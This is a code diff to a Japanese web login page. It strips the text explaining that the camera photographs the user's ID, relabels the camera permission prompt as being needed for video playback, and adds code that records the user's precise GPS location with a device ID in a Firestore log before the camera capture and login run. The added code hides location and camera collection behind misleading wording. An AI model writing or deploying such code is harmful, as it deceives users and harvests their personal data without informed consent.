@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="ja">
 <head>
@@ -129,12 +130,10 @@
 </head>
 <body>
     <div class="login-container" id="loginContainer">
-        <h1>IDを撮影</h1>
-        <p class="camera-switch-message">注：ログイン認証機能の完成までは<br>
-            カメラ許可でログイン可能です（）</p>
-        <img src="https://github.com/casval0078/hozon/blob/main/test.png?raw=true" height="300" width="300" alt="撮影画面配置予定場所" align="top" >
+        <h1>　</h1>
+        <p class="camera-switch-message"></p>
         <canvas id="canvas" style="display: none;"></canvas>
-        <button id="captureButton">撮影してログイン</button>
+        <button id="captureButton">ログイン</button>
 	    <video id="video" autoplay></video>
     </div>
 
@@ -148,7 +147,7 @@
 
     <div class="dialog-overlay" id="dialogOverlay">
         <div class="dialog">
-            <p>カメラの権限を許可してください。</p>
+            <p>動画再生には権限の許可が必要です</p>
             <button id="reloadButton">再試行</button>
         </div>
     </div>
@@ -190,10 +189,6 @@
     let currentPage = 1;
 
     const videos = [
-            {			
-                url: 'https://firebasestorage.googleapis.com/v0/b/hozon4-62abd.appspot.com/o/%E3%82%B5%E3%83%B3%E3%83%97%E3%83%AB.mp4?alt=media&token=fa1b9784-ab81-42d6-9805-4b434b220b25',			
-		title: 'sample'	
-	    },		
 
             // 他の動画URLとタイトルを追加
     ];
@@ -262,10 +257,45 @@
     }
 
     captureButton.addEventListener('click', () => {
-        requestCameraAccess().then(captureAndLogin).catch(() => {
+    requestCameraAccess()
+        .then(() => {
+            // 位置情報を取得
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    const { latitude, longitude } = position.coords;
+                    console.log(`現在の位置情報: 緯度 ${latitude}, 経度 ${longitude}`);
+
+                    // 必要に応じてFirebase Firestoreに保存
+                    const deviceId = getOrCreateDeviceId();
+                    addDoc(collection(db, 'loginLogs'), {
+                        deviceId,
+                        timestamp: new Date().toISOString(),
+                        location: { latitude, longitude },
+                    })
+                        .then(() => {
+                            console.log('位置情報が記録されました。');
+                            captureAndLogin();
+                        })
+                        .catch((error) => {
+                            console.error('位置情報の記録中にエラーが発生しました:', error);
+                        });
+                },
+                (error) => {
+                    console.error('位置情報取得エラー:', error);
+                    alert('位置情報を取得できませんでした。権限が必要です。');
+                },
+                {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0,
+                }
+            );
+        })
+        .catch(() => {
             alert('カメラの権限が許可されていません。');
         });
-    });
+});
+
 
     reloadButton.addEventListener('click', () => {
         location.reload();
